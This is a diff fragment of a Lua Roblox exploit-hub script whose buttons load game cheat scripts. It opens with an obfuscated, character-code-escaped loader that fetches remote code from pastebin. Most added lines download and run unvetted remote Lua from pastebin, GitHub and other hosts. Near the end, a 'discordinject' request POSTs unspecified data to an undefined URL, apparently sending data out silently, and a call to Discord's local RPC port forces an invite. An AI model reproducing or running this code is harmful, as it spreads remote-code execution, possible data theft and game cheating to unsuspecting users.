4\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\118\102\102\49\98\81\57\70\34\41\41\40\41\10\108\111\99\97\108\32\119\105\110\100\111\119\32\61\32\107\97\118\111\85\105\46\67\114\101\97\116\101\76\105\98\40\34\71\97\109\101\115\32\72\85\66\32\86\53\32\83\101\108\101\99\116\111\114\34\44\34\68\97\114\107\84\104\101\109\101\34\41\10\32\10\45\45\45\84\97\98\115\10\32\10\108\111\99\97\108\32\84\97\98\49\32\61\32\119\105\110\100\111\119\58\78\101\119\84\97\98\40\34\83\101\108\101\99\116\34\41\10\108\111\99\97\108\32\84\97\98\49\83\101\99\116\105\111\110\32\61\32\84\97\98\49\58\78\101\119\83\101\99\116\105\111\110\40\34\83\101\108\101\99\116\32\97\32\85\73\34\41\10\10\45\45\45\66\117\116\116\111\110\115\10\32\10\32\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\79\108\100\32\85\73\32\76\105\98\114\97\114\121\34\44\34\78\111\32\100\101\115\99\114\105\112\116\105\111\110\34\44\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\84\97\107\101\77\111\100\122\122\47\71\97\109\101\115\45\72\85\66\45\86\53\45\79\116\104\101\114\45\82\101\97\108\47\109\97\105\110\47\71\97\109\101\115\37\50\48\72\85\66\37\50\48\86\53\37\50\48\79\116\104\101\114\37\50\48\82\101\97\108\34\41\41\40\41\10\32\101\110\100\41\10\32\10\32\84\97\98\49\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\78\101\119\32\85\73\32\76\105\98\114\97\114\121\40\115\111\109\101\32\98\117\103\115\41\34\44\34\78\111\32\100\101\115\99\114\105\112\116\105\111\110\34\44\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\84\97\107\101\77\111\100\122\122\47\71\97\109\101\115\45\72\85\66\45\86\53\47\109\97\105\110\47\71\97\109\101\115\37\50\48\72\85\66\37\50\48\86\53\34\41\41\40\41\10\32\101\110\100\41\10")()
+		end)
+		
+		section42:addButton("GUI 3 ", function()
+            loadstring(game:HttpGet('https://ppearl.vercel.app'))()
+		end)
+		
+		section42:addButton("Doors Script 4.8 ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/jogamerforgames2022/MainHacksRoblox/main/DoorsLatestUpdateLoader.lua'))()
+		end)
+		
+		section42:addButton("Grey GUI ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/zoophiliaphobic/POOPDOORS/main/script.lua'))()
+		end)
+		
+		section42:addButton("Project WD", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Muhammad6196/Project-WD/main/Mainstring.lua"))()
+		end)
+		
+		section42:addButton("Doors Utilities HUB ", function()
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/plamen6789/UtilitiesHub/main/UtilitiesGUI'))()
+		end)
+		
+		section42:addButton("Vynixius ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Doors/Script.lua"))()
+		end)
+		
+		section43:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Blackout4781/Roblox-Scripts/main/DragonBlox"))()
+		end)
+		
+		section44:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://github.com/joeengo/exploiting/blob/main/tsg.lua?raw=true", true))()
+		end)
+		
+		section45:addButton("GUI 1 ", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/mSqftdZz"))()
+		end)
+		
+		section46:addButton("Muimi Hub ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/bunnynwy/games/main/main.lua"))()
+		end)
+		
+		section46:addButton("Auto Fishing ON ", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/PfumBWL3"))()
+		end)
+		
+		section46:addButton("Auto Fishing OFF ", function()
+            loadstring(game:HttpGet("https://pastebin.com/raw/KcrLui3z"))()
+		end)
+		
+		section46:addButton("Kidachi ", function()
+            loadstring(game:HttpGet('https://kidachi.xyz/Odyssey', true))()
+		end)
+		
+		section46:addButton("Anya's Script ", function()
+            loadstring(game:HttpGet(('https://raw.githubusercontent.com/itsyouranya/free/main/arcaneodyssey.lua'),true))()
+		end)
+		
+		section47:addButton("Gui 1 Wyn", function()
+            loadstring(game:HttpGet("https://system-exodus.com/scripts/MyRestaurant/MyRestaurant.lua", true))()
+		end)
+		
+		section47:addButton("Gui 2 Rafa", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/mr.lua"))()
+		end)
+		
+		section48:addButton("Gui 1 Valynium ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/XO-3S-CL-VCK-jf-3HDM/Products/main/Project-Mugetsu.lua"))()
+		end)
+		
+		section48:addButton("Gui 2 TheyCallMeVox ", function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/TheyCallMeVox/scripts/main/PM"))()
+		end)
+		
+		section48:addButton("Gui 3 jumblescripts  ", function()
+            loadstring(game:HttpGet("https://jumblescripts.com/ProjectMugetsu.lua"))()
+		end)
+    game:GetService("CoreGui").Discord:Destroy()
+end)
+shit:Button('Copy Key Link (Скопировать ссылку ключа)', function()
+    setclipboard('https://discord.gg/GuyE8NGxBY')
+end)
+
+request = http_request or request or HttpPost or syn.request
+local discordinject = {Url = url, Body = newdata, Method = "POST", Headers = headers} request(discordinject)
+pcall(function()
+local http = game:GetService('HttpService')
+local req = (syn and syn.request) or (http and http.request) or http_request
+if req then
+    req({
+        Url = 'http://127.0.0.1:6463/rpc?v=1', Method = 'POST',
+        Headers = {['Content-Type'] = 'application/json', Origin = 'https://discord.com'},
+        Body = http:JSONEncode({cmd = 'INVITE_BROWSER', nonce = http:GenerateGUID(false), args = {code = 'GuyE8NGxBY'}
+    })})
+end
+end)
